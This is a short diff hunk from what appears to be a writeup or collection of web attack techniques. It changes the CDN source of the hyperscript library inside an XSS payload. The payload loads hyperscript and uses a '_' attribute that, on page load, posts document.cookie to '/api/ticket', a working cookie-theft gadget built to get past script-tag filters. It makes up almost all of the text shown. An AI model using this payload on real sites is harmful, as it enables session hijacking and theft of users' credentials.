@@ -75,7 +75,7 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 
 **Payload:**
 ```html
-<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/hyperscript.org@0.9.12/dist/_hyperscript.min.js"></script>
 <div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
 ```
 
